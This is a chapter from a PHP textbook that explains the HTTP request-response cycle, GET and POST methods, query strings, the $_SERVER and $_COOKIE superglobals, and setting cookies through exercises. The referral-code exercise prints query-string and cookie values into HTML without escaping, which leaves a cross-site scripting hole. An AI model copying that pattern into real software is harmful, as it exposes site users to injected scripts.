<html><head></head><body>
		<div>
			<div class="Content" id="_idContainer128">
			</div>
		</div>
		<div class="Content" id="_idContainer129">
			<h1 id="_idParaDest-210"><a id="_idTextAnchor217"/>6. Using HTTP</h1>
		</div>
		<div class="Content" id="_idContainer171">
			<p class="callout-heading">Overview</p>
			<p class="callout">By the end of this chapter, you will be able to explain the Request-Response Cycle of an application; explain the various HTTP methods; perform data sanitization and validation; track user session data; and build a web application.</p>
			<p class="callout">This chapter presents you with the necessary tools to use and implement HTTP requests in practical web applications. You will become familiar with request types and URL components and will learn about common vulnerabilities on the <strong class="bold">World Wide Web</strong> (<strong class="bold">WWW</strong>) as well as learn how to protect your applications against such attacks.</p>
			<h1 id="_idParaDest-211"><a id="_idTextAnchor218"/>Introduction</h1>
			<p>So far, we have analyzed and learned about the PHP language itself – including data types, expressions, operators, and control statements – and how to use them in functions and classes. Before we jump into building a web application using what we have learned so far, it is crucial to understand client-server communication in a web application.</p>
			<p>A web application (that is, a website) is designed to return a response for each request, which leads to a <strong class="bold">Request-Response cycle</strong>. In the web application world, this cycle is done through <strong class="bold">Hypertext Transfer Protocol</strong> (<strong class="bold">HTTP</strong>), which is a protocol that ensures both sides communicate with the same language or structure. HTTP requires data to be sent in two ways – from the client to the server (the request), and then the other way around; that is, from the server to the client (the response), closing the cycle. The Request-Response cycle doesn't necessarily mean a hit in application logic; it can be a request for a resource, such as a CSS file, an image, or even a PDF file. Essentially, most file downloads are the result of an HTTP request. All typical web applications require some HTTP requests to deliver on the WWW.</p>
			<p>In this chapter, we will perform HTTP requests using various HTTP methods. We will handle these HTTP requests in PHP by sanitizing and validating the input data, and we will learn how to protect against malicious requests. By the end of this chapter, you will have built your first web application using basic authentication, file upload, and temporary data storage features.</p>
			<h1 id="_idParaDest-212"><a id="_idTextAnchor219"/>The Request-Response Cycle of a Web Application</h1>
			<p>To understand how an application loads in a browser, or how it gets data from a server, it is important to know about the Request-Response cycle. The Request-Response model is used extensively and it's not only applicable to web applications (such as using a browser). In fact, it's also used in the communication between machines; for example, for fetching data from a database, which involves the application system on one side and the database system on the other side. In this case, the application is the client for the database system.</p>
			<p>HTTP is the most commonly used protocol for web applications and, since it could take up a whole book itself, we'll cover only the most important part here, explaining how it works.</p>
			<p>Each web application takes a request and prepares a response for it. Usually, the Request-Response cycle for a web application looks similar to this:</p>
			<ol>
				<li>The client makes a request; for example, <strong class="source-inline">GET /path</strong>.</li>
				<li>The server receives the request and looks for an existing or static file for the specified URI, which is returned to the client. If the static file is not there, then the request is treated as dynamic and it is sent to the application.</li>
				<li>The application prepares and sends a response back (that is, it processes the request) to the server layer.</li>
				<li>The server forwards the response from the application to the client:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer130">
					<img alt="Figure 6.1: The Request-Response Cycle for a web application&#13;&#10;" src="image/C14196_06_01.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.1: The Request-Response Cycle for a web application</p>
			<p>Let's understand what's going on here:</p>
			<ol>
				<li value="1">The <strong class="bold">CLIENT</strong> of a web application is usually the browser, so I'll stick to using the browser as a client for the following. Each time a URL is accessed through a browser's address bar, a form is submitted or a background call is performed with AJAX, and a new request is made to that URL. Following the hostname (or website domain), which is an alias for a server's IP address, the request will hit a server.</li>
				<li>The <strong class="bold">SERVER</strong> role is very important for a web application. In this case, it will try to route only dynamic requests to the PHP application. Therefore, one rule in the server's configuration could be to check for files inside the public web directory of the application, given the URI, and then return the file if that one exists; if the file is not there, treat the request as dynamic and forward it to the PHP application.</li>
				<li>The application receives the request and, based on it, it will perform certain actions such as fetching a list of heroes from the database and listing them in a specific order, and then the response will be prepared and sent back.</li>
				<li>The server will simply forward that response to the open request.</li>
			</ol>
			<p>Of course, this is a simplistic example of an application infrastructure setup and a basic example of the Request-Response cycle. Nowadays, especially when you design a web application while having scalability in mind, the diagram would look very different. However, the good thing is that you, as the developer, don't have to worry about this, or at least not yet.</p>
			<p>What is important to bear in mind here is that each web application is designed to respond to a request with a response, no matter where the request comes from – be it a <strong class="source-inline">nginx</strong> server or the built-in one – because all requests will look the same.</p>
			<h2 id="_idParaDest-213"><a id="_idTextAnchor220"/>A Typical HTTP Request</h2>
			<p>Each HTTP request is parsed by PHP automatically.</p>
			<p>Here is an example of an HTTP request, when accessing the <a href="https://www.packtpub.com/tech">https://www.packtpub.com/tech</a> URL:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer131">
					<img alt="Figure 6.2: A sample HTTP request&#13;&#10;" src="image/C14196_06_02.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.2: A sample HTTP request</p>
			<p>These headers are generated by the web browser in this case. From this request, the application can make use of a lot of information. First of all, this is a <strong class="source-inline">GET</strong> request for the <strong class="source-inline">/tech</strong> URI, using the <strong class="source-inline">HTTP/1.1</strong> protocol (line 1) and the called host is (line 2). The browser sets these parameters based on the URL in the address bar. The <strong class="source-inline">Connection</strong> header is set to a <strong class="source-inline">keep-alive</strong>, meaning the connection to the server is not closed and subsequent requests to that server can be made (line 3). </p>
			<p>The <strong class="source-inline">Upgrade-Insecure-Requests</strong> header gives a hint to the server to let it know that the client prefers an encrypted and authenticated response (that is, it prefers HTTPS over HTTP). The <strong class="source-inline">User-Agent</strong> header contains the client information – in this case, it is the Chromium browser – providing useful information about the build. The <strong class="source-inline">Accept</strong> header gives us a hint about the content expected by the client, grouped by quality. The <strong class="source-inline">q</strong> here is called the factor weighting and it gives the quality of each value in this header entry, where a greater number is associated with greater quality. The default is <strong class="source-inline">*/*</strong>, meaning that any content type is expected. So, in our case, it appears with the lowest quality: <strong class="source-inline">0.8</strong>. <strong class="source-inline">Accept-Encoding</strong> details the content encoding of the response, which the client is able to understand. The <strong class="source-inline">Accept-Language</strong> header details which languages the client is able to understand and which locales are preferred; again, this is grouped by priority, using the same <strong class="source-inline">q</strong> weighting factor. The <strong class="source-inline">Cookie</strong> header is one of the most important headers and is one convenient way to send data from the client to the server. We will talk more about this later.</p>
			<h2 id="_idParaDest-214"><a id="_idTextAnchor221"/>A Typical HTTP Response</h2>
			<p>For the previous request, we will get the following response headers:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer132">
					<img alt="Figure 6.3 A sample HTTP response&#13;&#10;" src="image/C14196_06_03.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.3 A sample HTTP response</p>
			<p>The most important information in a response is the response status, with <strong class="bold">2xx</strong> being associated with successful requests. A full list of statuses can be found at <a href="https://packt.live/2owOHG2">https://packt.live/2owOHG2</a>. In our case, we got <strong class="bold">200 OK</strong>, which means the request succeeded. Among the most well-known HTTP response statuses are the following:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer133">
					<img alt="Figure 6.4: HTTP response statuses &#13;&#10;" src="image/C14196_06_04.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.4: HTTP response statuses </p>
			<p>Some of the most common headers include the following:</p>
			<ul>
				<li><strong class="bold">Date</strong>: This represents the date and time the HTTP response message was created.</li>
				<li><strong class="bold">Content-Type</strong>: This is used to indicate the media type (or <strong class="bold">Multipurpose Internet Mail Extensions</strong> (<strong class="bold">MIME</strong>) type) of the resource.</li>
				<li>Expires: This contains the date/time after which the response is considered outdated.</li>
				<li><strong class="bold">Cache-Control</strong>: This is used to specify directives for caching mechanisms.</li>
				<li><strong class="bold">Content-Encoding</strong>: This is used to compress the media type. When present, its value indicates which encodings were applied to the entity body. Notice that the request contained the <strong class="bold">Accept-Encoding</strong> header: <strong class="source-inline">gzip</strong>, <strong class="source-inline">deflate</strong>, and the <strong class="source-inline">br</strong> header, showing that <strong class="source-inline">gzip</strong> is a known encoding mechanism that the browser uses. So, the server used it to compress the data using <strong class="source-inline">gzip</strong>.</li>
				<li>Non-standard <strong class="bold">X-</strong> prefixed headers: Although this convention has been deprecated already, it is still used for custom proprietary headers.</li>
			</ul>
			<h2 id="_idParaDest-215"><a id="_idTextAnchor222"/>Request Methods</h2>
			<p>As we previously mentioned, the request has a <strong class="source-inline">GET</strong> token right at the beginning of the message, meaning that it is a request of the <strong class="source-inline">GET</strong> type. This is one of the most commonly used HTTP request types because it is a means of fetching data from a server, be it an HTML page, an image, a <strong class="source-inline">PDF</strong> document, or plaintext data. As you might guess, there are more types of HTTP requests, and these are <strong class="source-inline">POST</strong>, <strong class="source-inline">OPTIONS</strong>, <strong class="source-inline">HEAD</strong>, <strong class="source-inline">PUT</strong>, and <strong class="source-inline">DELETE</strong>, among others. We will not cover all of these here, except the essential ones.</p>
			<h2 id="_idParaDest-216"><a id="_idTextAnchor223"/>GET HTTP Requests</h2>
			<p>The <strong class="source-inline">GET HTTP</strong> request is the most commonly used for a web application. It provides the necessary information for the resource that is requested from the server. This resource information can be placed in the <strong class="source-inline">query string</strong>, the <strong class="source-inline">path</strong> of the URL, or both.</p>
			<p>Let's inspect how the <a href="https://www.packtpub.com/tech/PHP">https://www.packtpub.com/tech/PHP</a> URL is composed:</p>
			<ol>
				<li value="1">First, we have the protocol – <strong class="source-inline">https</strong> – meaning the secured HTTP protocol is used.</li>
				<li>Then, it's the hostname, pointing to the location of the required resource. </li>
				<li>And, finally, there is the path, pointing to the <em class="italic">resource identifier</em>.</li>
			</ol>
			<p>So, we can say the URL describes <em class="italic">how</em> (<strong class="source-inline">https</strong>), <em class="italic">where</em> from (<a href="http://www.packtpub.com">www.packtpub.com</a>), and <em class="italic">what</em> (<strong class="source-inline">/tech/PHP</strong>) is requested, especially when it's about <strong class="source-inline">GET</strong> requests. This is visualized in the following figure:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer134">
					<img alt="Figure 6.5: An interpretation of the URL components&#13;&#10;" src="image/C14196_06_05.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.5: An interpretation of the URL components</p>
			<p>Important: <em class="italic">For security reasons, do not use GET to send sensitive information, such as login credentials</em>. Since <strong class="source-inline">GET</strong> uses query strings to send data, and this data is part of the URL, which is visible to everyone. Therefore, it remains in the browser history – this means that your browser will essentially keep your login URL in its history. This can be observed in the following screenshot:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer135">
					<img alt="Figure 6.6 Sending login credentials via the GET HTTP method&#13;&#10;" src="image/C14196_06_06.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.6 Sending login credentials via the GET HTTP method</p>
			<p>This is just one example of how this method is bad for sending sensitive information. A better approach is to use the <strong class="source-inline">POST</strong> method for sending data that you don't want to store in the browser's history; this data could include login credentials, updating your profile with personal (or any) details, file uploads, and questionnaires. On the contrary, sending HTML forms using the <strong class="source-inline">GET</strong> method would be appropriate in the case of a page with a list of items, where we need to do filtering and sorting. Therefore, it is appropriate for the filter and sort parameters to be present in the query string component of the URL, so that when we bookmark or share the URL, you can get the same filtered and sorted items when accessing the URL later or from another browser or location.</p>
			<h2 id="_idParaDest-217"><a id="_idTextAnchor224"/>POST HTTP Requests</h2>
			<p>The <strong class="source-inline">POST</strong> requests are used to create, alter, and/or delete resources on a server. This is due to the fact that <strong class="source-inline">POST</strong> requests have a body and not only headers. So, you can <strong class="source-inline">POST</strong> to <strong class="source-inline">/some/uri</strong> and send data in the request body in two ways: by default, as URL-encoded parameters (<strong class="source-inline">application/x-www-form-urlencoded enctype</strong>); or as multipart form data (<strong class="source-inline">multipart/form-data enctype</strong>). The difference between these two methods is based on what kind of data is sent to the server. So, when you want to upload an image, a PDF document, or any other file, you would use multipart form data; otherwise, URL-encoded data is enough.</p>
			<p>Sending multipart form data from HTML is enough to add the <strong class="source-inline">enctype</strong> attribute to the <strong class="source-inline">form</strong> element, as shown in the following snippet:</p>
			<p class="source-code">&lt;form method="post" enctype="multipart/form-data"&gt;</p>
			<p class="source-code">    &lt;input type="file" name="myfile" &gt;</p>
			<p class="source-code">    &lt;input type="submit" value="Upload"&gt;</p>
			<p class="source-code">&lt;/form&gt;</p>
			<p>Additionally, the browser will set the appropriate <strong class="source-inline">Content-Type</strong> request header, which would look like the following:</p>
			<p class="source-code">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryS8mb</p>
			<p>The <strong class="bold">boundary</strong> term here is used to specify a sent content delimiter, preferably a random non-dictionary string, which is less likely to appear in the sent payload. In the case of using HTML forms in the browser, you don't have to care about this parameter, as its value is generated and set automatically by the browser.</p>
			<p>Instead, when you only want to send some mapped textual data, without an upload, you can use <strong class="source-inline">application/x-www-form-urlencoded</strong> for the <strong class="source-inline">enctype</strong> attribute, which is set as the default when the <strong class="source-inline">enctype</strong> attribute is missing, as shown in the following snippet:</p>
			<p class="source-code">&lt;form method="post" enctype="application/x-www-form-urlencoded"&gt;</p>
			<p class="source-code">    &lt;input type="text" name="nickname"&gt;</p>
			<p class="source-code">    &lt;input type="submit" value="Save"&gt;</p>
			<p class="source-code">&lt;/form&gt;</p>
			<p>The URL-encoded form is very easy to send with command-line tools, such as <strong class="source-inline">curl</strong>.</p>
			<p>A sample command for the preceding <strong class="source-inline">form</strong> element would look like the following:</p>
			<p class="source-code">curl 'http://127.0.0.1:8080/form-url-encoded.php' -H 'Content-Type: application/x-www-form-urlencoded' --data 'nickname=Alex' </p>
			<p>This is assuming that <strong class="source-inline">127.0.0.1:8080</strong> is where our server is listening and <strong class="source-inline">form-url-encoded.php</strong> is the PHP file that will process the request.</p>
			<ul>
				<li>What method should be used in the case of sign-up, a newsletter subscription, and a content search form? Why?</li>
				<li>What are some other use cases for submitting the <strong class="source-inline">form</strong> with the <strong class="source-inline">POST</strong> and <strong class="source-inline">GET</strong> methods? (For example, posting comments, rating a product, pagination, and more.)</li>
			</ul>
			<p>Some servers will limit the query string length to 1,024 characters; for example, in the case of <strong class="source-inline">Internet Information Server</strong> (<strong class="source-inline">IIS</strong>). This limit can be configured in any server, but with daily use, it is less likely that you would encounter such an issue. Unlike the <strong class="source-inline">GET</strong> method, with <strong class="source-inline">POST</strong>, you have <em class="italic">no limit</em> on the data you can send over an HTTP request. Currently, the default limit for the <strong class="source-inline">POST</strong> payload in PHP per request is 8 MB, which can be increased at will in the settings. </p>
			<h1 id="_idParaDest-218"><a id="_idTextAnchor225"/>Query Strings</h1>
			<p>A query string is part of a URL, containing data described in key-value pairs. Each key-value pair is delimited by the ampersand character (<strong class="source-inline">&amp;</strong>), while the delimiter of a URL path from its query string is a question mark (<strong class="source-inline">?</strong>).</p>
			<p>As an example, we'll use the following fictive URL:</p>
			<p><a href="https://www.bookstore.com/books/?category=Comics&amp;page=2">https://www.bookstore.com/books/?category=Comics&amp;page=2</a>.</p>
			<p>Here, the query string is <strong class="source-inline">category=Comics&amp;page=2</strong> and the parameters are <strong class="source-inline">category</strong> and <strong class="source-inline">page</strong> with <strong class="source-inline">Comics</strong> and <strong class="source-inline">2</strong> values, respectively. It is worth noting that the parameters that can hold data are then parsed as arrays of values. For example, given the <strong class="source-inline">/filter?tags[]=comics&amp;tags[]=recent</strong> URI, the tags query string parameter will result in an array with two values – <strong class="source-inline">comics</strong> and <strong class="source-inline">recent</strong>.</p>
			<p>Query strings are mostly used to access resources on the server, rather than as instructions to create, update, or delete. So, sharing a URL with a query string would list the same results in any browser, when no other contexts are interfering (such as logged-in user preferences, visitor location, or others). Take a look at what the URL looks like after you perform a search in your favorite search engine.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">Learn more about HTTP at <a href="https://developer.mozilla.org/en-US/docs/Glossary/HTTP">https://developer.mozilla.org/en-US/docs/Glossary/HTTP</a>.</p>
			<p class="callout">Learn more about URLs at <a href="https://packt.live/33p2o8y">https://packt.live/33p2o8y</a> or <a href="https://packt.live/2BcUNxL">https://packt.live/2BcUNxL</a>.</p>
			<p class="callout">Learn more about query strings at <a href="https://packt.live/31fFtey">https://packt.live/31fFtey</a>.</p>
			<h1 id="_idParaDest-219"><a id="_idTextAnchor226"/>PHP Superglobals</h1>
			<p>The PHP engine uses a list of built-in variables that are accessible anywhere in a PHP script, called <strong class="bold">superglobals</strong>. These superglobals contain data that is mostly related to requests, but they also contain some server information and running PHP script file information as well.</p>
			<p>The most frequently used superglobals are the <strong class="source-inline">$_SERVER</strong>, <strong class="source-inline">$_SESSION</strong>, <strong class="source-inline">$_GET</strong>, <strong class="source-inline">$_POST</strong>, <strong class="source-inline">$_COOKIE</strong>, and <strong class="source-inline">$_FILES</strong> variables.</p>
			<p>A good practice is to not mess with superglobals across a project, meaning it would be better not to alter the existing data or to add more or remove data from these variables. Ideally, you would only access them once per request. <strong class="source-inline">$_SESSION</strong> is an exception in this matter, as its data is provided by the application and not by the PHP engine.</p>
			<p>You can always learn about superglobals in more depth by visiting the official PHP documentation page, at <a href="http://php.net/manual/en/language.variables.superglobals.php">http://php.net/manual/en/language.variables.superglobals.php</a>.</p>
			<h2 id="_idParaDest-220"><a id="_idTextAnchor227"/>$_SERVER</h2>
			<p>The <strong class="source-inline">$_SERVER</strong> superglobal contains request headers, server information, paths, environment variables, and other data set by the web server. In short, request headers' names are converted to uppercase, the <strong class="source-inline">-</strong> (dash) is replaced by <strong class="source-inline">_</strong> (underscore), and <strong class="source-inline">HTTP_</strong> is prepended (the <strong class="source-inline">User-Agent</strong> header name becomes <strong class="source-inline">HTTP_USER_AGENT</strong> in <strong class="source-inline">$_SERVER</strong>). Requested information field names (such as URI and method) are prefixed with <strong class="source-inline">REQUEST_</strong>, and so on. Most of these names in the <strong class="source-inline">$_SERVER</strong> superglobal are accounted for in the <strong class="source-inline">CGI/1.1 specification</strong>.</p>
			<h2 id="_idParaDest-221"><a id="_idTextAnchor228"/>Exercise 6.1: Dumping the $_SERVER Data</h2>
			<p>In the following exercise, we will dump the <strong class="source-inline">$_SERVER</strong> data in the browser for each HTTP request and will identify the key data used by the web application. Before we continue, please create a directory and use the Terminal to navigate into that new directory. All the created files will be saved into this directory; for example, let's assume the created directory is <strong class="source-inline">/app</strong>.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">In order to send an HTTP request to the PHP script (that is, to access the script through the browser), you need to start the built-in PHP development server. In order to do so, run the command that will start the development server in your <strong class="source-inline">/app</strong> working directory: <strong class="source-inline">php -S 127.0.0.1</strong>. Keep the server running for the next exercises as well.</p>
			<ol>
				<li value="1">Create a PHP file called <strong class="source-inline">super-server.php</strong> and write the following code:<p class="source-code">&lt;?php echo sprintf("&lt;pre&gt;%s&lt;/pre&gt;", print_r($_SERVER, true)); </p></li>
				<li>Access the file through the built-in server, at <strong class="source-inline">http://127.0.0.1:8080/super-server.php/my-path?my=query-string</strong>.<p>The output should look like the following:</p><div class="IMG---Figure" id="_idContainer136"><img alt="Figure 6.7 The server data in the browser window&#13;&#10;" src="image/C14196_06_07.jpg"/></div><p class="figure-caption">Figure 6.7 The server data in the browser window</p></li>
				<li>Run the <strong class="source-inline">super-server.php</strong> file in the Terminal using the following:<p class="source-code">php super-server.php</p><p>The output should look like the following:</p></li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer137">
					<img alt="Figure 6.8 Server data in the Terminal&#13;&#10;" src="image/C14196_06_08.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.8 Server data in the Terminal</p>
			<p>Some often-used inputs in the case of scripts invoked by <em class="italic">WWW</em> (run due to the URL access) are <strong class="source-inline">REQUEST_URI</strong>; <strong class="source-inline">REQUEST_METHOD</strong>; <strong class="source-inline">PATH_INFO</strong>; <strong class="source-inline">REMOTE_ADDR</strong>, which is the network address of the client sending the request (or <strong class="source-inline">HTTP_X_FORWARDED_FOR</strong> when running your application behind a load balancer or a reverse proxy, for example); and <strong class="source-inline">HTTP_USER_AGENT</strong>.</p>
			<p>In the preceding script, you will notice that the <strong class="source-inline">/my-path</strong> path is parsed in <strong class="source-inline">PATH_INFO</strong> and the query string in <strong class="source-inline">QUERY_STRING</strong>, while the entire URI is available in <strong class="source-inline">REQUEST_URI</strong>. These are the inputs used to route the requests to the appropriate PHP scripts in a web application so that the scripts can process them and produce the response.</p>
			<p>In the case of command-line scripts (run in Terminal or scheduled to run by the system at specific intervals), the most common <strong class="source-inline">$_SERVER</strong> inputs are <strong class="source-inline">argv</strong> and <strong class="source-inline">argc</strong>, as well as <strong class="source-inline">REQUEST_TIME</strong> and <strong class="source-inline">REQUEST_TIME_FLOAT</strong>, and <strong class="source-inline">PWD</strong>. <strong class="source-inline">argv</strong> is the list of argument values passed to the PHP executable. </p>
			<p>The first argument (position zero) is the file being executed (or a static sentence, Standard input code, in the case of the running inline PHP code; for example, <strong class="source-inline">php -r 'print_r($_SERVER);'</strong>). Now, <strong class="source-inline">argc</strong> is the count of input arguments. <strong class="source-inline">REQUEST_TIME</strong> and <strong class="source-inline">REQUEST_TIME_FLOAT</strong> represent the time when the script started the execution, and are used for logging purposes or miscellaneous benchmarks. <strong class="source-inline">PWD</strong> is the current working directory and is useful in cases when the script should perform actions relative to the current location on disk, such as opening files or saving into files in the current directory.</p>
			<p>Unlike the request made from the browser, the <strong class="source-inline">$_SERVER</strong> variable has much less data when running in the command-line interface. There are no more <strong class="source-inline">HTTP_*</strong> entries and no more <strong class="source-inline">SERVER_*</strong> entries, since the request is not via HTTP anymore; <strong class="source-inline">QUERY_STRING</strong> and <strong class="source-inline">REQUEST_METHOD</strong> are also missing, among others.</p>
			<h2 id="_idParaDest-222"><a id="_idTextAnchor229"/>$_COOKIE</h2>
			<p>The <strong class="source-inline">$_COOKIE</strong> superglobal contains all the cookie data stored in the browser (when the browser is the HTTP client), stored by the same host, through the response headers or JavaScript. Since HTTP requests are stateless — meaning they are independent and unrelated to each other — using cookies is a great way to keep track of the user session in a web application, and also to offer a tailored experience for each visitor. Think of settings related to ad preferences, reference code to track conversions coming from several sources, and others. Cookies are <em class="italic">invisible</em> data; that is, they are not to be found in the URL and are not triggered by the submit button of an HTML form. They are set in the browser by the application, and the browser sends them with each HTTP request. Cookies are visible to browser users and, more than that, they can be removed by users — a fact an application is required to deal with.</p>
			<p>It is possible to store cookies using PHP's built-in function, <strong class="source-inline">setcookie()</strong>, and we can get those key-value pairs in the next HTTP requests from the <strong class="source-inline">$_COOKIE</strong> superglobal. To set a cookie, it's enough to call <strong class="source-inline">setcookie("cookie_name", "cookie_value")</strong>, and the value will be stored until the browser is closed. Alternatively, to make the cookie live longer than the browser session, you must specify the cookie's expiration time in the third argument of the function, as a Unix timestamp. For example, to allow a cookie to last for two days, you could call <strong class="source-inline">setcookie("cookie_name", "cookie_value", time()+60*60*24*2)</strong>.</p>
			<p>The <strong class="source-inline">setcookie()</strong> function accepts a cookie name as the first parameter, the cookie value as the second parameter, and the Unix time in seconds for the expiration as the third parameter.</p>
			<p>The syntax is as follows: </p>
			<p class="source-code">setcookie(</p>
			<p class="source-code">  string $name, string $value = "", int $expires = 0, string $path = "",</p>
			<p class="source-code">  string $domain = "", bool $secure = FALSE, bool $httponly = FALSE</p>
			<p class="source-code">): bool</p>
			<p class="source-code">// or</p>
			<p class="source-code">setcookie(string $name, string $value = "", array $options = []) : bool</p>
			<p>The parameters are as follows:</p>
			<ul>
				<li><strong class="bold">name</strong>: The cookie name.</li>
				<li><strong class="bold">value</strong>: The cookie value; this is optional.</li>
				<li><strong class="bold">expires</strong>: The expiration time, as a timestamp – this is optional; if omitted, the cookie will be deleted after the browser closes.</li>
				<li><strong class="bold">path</strong>: The path for which the cookie will be available; for example, <strong class="source-inline">/tech</strong> (this is optional).</li>
				<li><strong class="bold">domain</strong>: The (sub)domain for which the cookie will be available. Cookies set in the current domain will become available for any subdomain of the current domain; this is an optional parameter.</li>
				<li><strong class="bold">secure</strong>: This indicates that the cookie is set and transmitted only through the HTTPS request (that is, a secured request); this is optional.</li>
				<li><strong class="bold">httponly</strong>: This indicates that the cookie is only available for HTTP requests; this is not available to scripting languages such as JavaScript on the client side (that is, the browser). This is an optional parameter.</li>
				<li><strong class="bold">options</strong>: This is an associative array that may have any of the <strong class="source-inline">expires</strong>, <strong class="source-inline">path</strong>, <strong class="source-inline">domain</strong>, <strong class="source-inline">secure</strong>, <strong class="source-inline">httponly</strong>, and <strong class="source-inline">samesite</strong> keys. The values have the same meaning as the parameters with the same name. The value of the <strong class="source-inline">samesite</strong> element should be either <strong class="source-inline">Lax</strong> or <strong class="source-inline">Strict</strong>. This parameter is optional.<p class="callout-heading">Note</p><p class="callout">For the full API of <strong class="source-inline">setcookie()</strong>, please visit <a href="https://packt.live/2MI81YC">https://packt.live/2MI81YC</a>.</p></li>
			</ul>
			<h2 id="_idParaDest-223"><a id="_idTextAnchor230"/>Exercise 6.2: Setting and Reading a Cookie</h2>
			<p>In the following exercise, you will set a cookie and then read it in a PHP script using an HTML form to send data. </p>
			<p>Here are the steps to perform the exercise:</p>
			<ol>
				<li value="1">Create a file called <strong class="source-inline">super-cookie.php</strong>.</li>
				<li>Store the referral code in cookies so that we can read from it later (for example, at sign-up, to know who referred this user to us). The code for this is as follows:<p class="source-code">if (array_key_exists('refcode', $_GET)) {</p><p class="source-code">// store for 30 days</p><p class="source-code">    setcookie('ref', $_GET['refcode'], time() + 60 * 60 * 24 * 30); </p><p class="source-code">} else {</p><p class="source-code">    echo sprintf('&lt;p&gt;No referral code was set in query string.&lt;/p&gt;');</p><p class="source-code">}</p><p>Here, the cookie value to be stored will be read from the <strong class="source-inline">refcode</strong> query string parameter: <strong class="source-inline">/?refcode=etc</strong>. Therefore, for each request, we will have to check for this entry in the <strong class="source-inline">$_GET</strong> variable and, if found, save the cookie with a lifetime of 30 days; otherwise, just print <strong class="source-inline">No referral code was set in query string.</strong> The cookie name is user-defined and, here, we have called it <strong class="source-inline">ref</strong>.</p><p class="callout-heading">Note</p><p class="callout">We use the <strong class="source-inline">time()</strong> function to get the current Unix time, in seconds. Therefore, for the current time, we should add 60 (seconds) multiplied by 60 (minutes), multiplied by 24 (hours), multiplied by 30 (days), for the cookie to expire after 30 days.</p></li>
				<li>Additionally, when storing the cookie, we may want to know what code was saved and include a link to the same script, without the query string, to avoid storing the cookie on page refresh. Here is the code to do this:<p class="source-code">if (array_key_exists('refcode', $_GET)) {</p><p class="source-code">// store for 30 days</p><p class="source-code">    setcookie('ref', $_GET['refcode'], time() + 60 * 60 * 24 * 30);</p><p class="source-code">    echo sprintf('&lt;p&gt;The referral code [%s] was stored in a cookie. ' .</p><p class="source-code">        'Reload the page to see the cookie value above. ' .</p><p class="source-code">        '&lt;a href="super-cookie.php"&gt;Clear the query string&lt;/a&gt;.&lt;/p&gt;',           $_GET['refcode']);</p><p class="source-code">} else {</p><p class="source-code">    echo sprintf('&lt;p&gt;No referral code was set in query string.&lt;/p&gt;');</p><p class="source-code">}</p></li>
				<li>Next, write the code to print the cookie value, which is stored in the browser and sent to the script in the HTTP request. For this, we have to read the <strong class="source-inline">$_COOKIE</strong> variable. If no <strong class="source-inline">ref</strong> entry exists, then display <strong class="source-inline">-NONE-</strong>. The code to do this is as follows:<p class="source-code">echo sprintf(</p><p class="source-code">    '&lt;p&gt;Referral code (sent by browser as cookie): [%s]&lt;/p&gt;',       array_key_exists('ref', $_COOKIE) ? $_COOKIE['ref'] : '-None-'</p><p class="source-code">);</p><p class="callout-heading">Note</p><p class="callout">From the request when the cookie gets saved for the first time, we will also get <strong class="source-inline">-None-</strong>, since the cookie gets saved after a Request-Response cycle is completed and, in this case, the request does not have the <strong class="source-inline">ref</strong> cookie (that is, it is not present in the browser yet), but has the <strong class="source-inline">refcode</strong> query string parameter, which makes the script set the <strong class="source-inline">ref</strong> cookie value in the response (and it will then be saved by the browser).</p></li>
				<li>Also, to make easy tests sending different referral codes, let's use a form of type <strong class="source-inline">GET</strong>, using input with the <strong class="source-inline">refcode</strong> name (which will appear in <strong class="source-inline">query string</strong> in the form submit) and the <strong class="source-inline">EVENT19</strong> default value:<p class="source-code">&lt;form action="super-cookie.php" method="get"&gt;</p><p class="source-code">    &lt;input type="text" name="refcode" placeholder="EVENT19" value="EVENT19"&gt;</p><p class="source-code">    &lt;input type="submit" value="Apply referral code"&gt;</p><p class="source-code">&lt;/form&gt;</p><p class="callout-heading">Note</p><p class="callout">When no method is specified in the HTML <strong class="source-inline">form</strong> element, the default value is <strong class="source-inline">GET</strong>.</p><p>As seen in this example, to use PHP scripts and HTML in the same file, we require PHP scripts to be included between the <strong class="source-inline">&lt;?php</strong> and <strong class="source-inline">?&gt;</strong> tokens.</p><p class="callout-heading">Note</p><p class="callout">You can refer the complete code at <a href="https://packt.live/2IMViTs">https://packt.live/2IMViTs</a>.</p></li>
				<li>Access the file through the built-in server, at <strong class="source-inline">http://127.0.0.1:8080/super-cookie.php</strong>.<p>The output should look like this:</p><p> </p><div class="IMG---Figure" id="_idContainer138"><img alt="Figure 6.9 The output of super-cookie.php when first accessed&#13;&#10;" src="image/C14196_06_09.jpg"/></div><p class="figure-caption">Figure 6.9 The output of super-cookie.php when first accessed</p></li>
				<li>Click on the <strong class="source-inline">Apply referral code</strong> button, and notice the new page content, which should look like this:<div class="IMG---Figure" id="_idContainer139"><img alt="" src="image/C14196_06_10.jpg"/></div><p class="figure-caption">Figure 6.10: The output of super-cookie.php after submitting the form</p><p>At this stage, by clicking on the <strong class="source-inline">Apply referral code</strong> button, the form data has been serialized to the URL query format (refer to the <strong class="source-inline">refcode=EVENT19</strong> part in the preceding diagram). Accessing the form target URL made the script read the data from the query string and set the cookie with the provided <strong class="source-inline">EVENT19</strong> value.</p></li>
				<li>Click on <strong class="source-inline">Clear the query string</strong> and see that the script is able to parse and display the cookie data. The output should now display the cookie value, which was set in the previous step:</li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer140">
					<img alt="Figure 6.11: The output of super-cookie.php on subsequent requests&#13;&#10;" src="image/C14196_06_11.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.11: The output of super-cookie.php on subsequent requests</p>
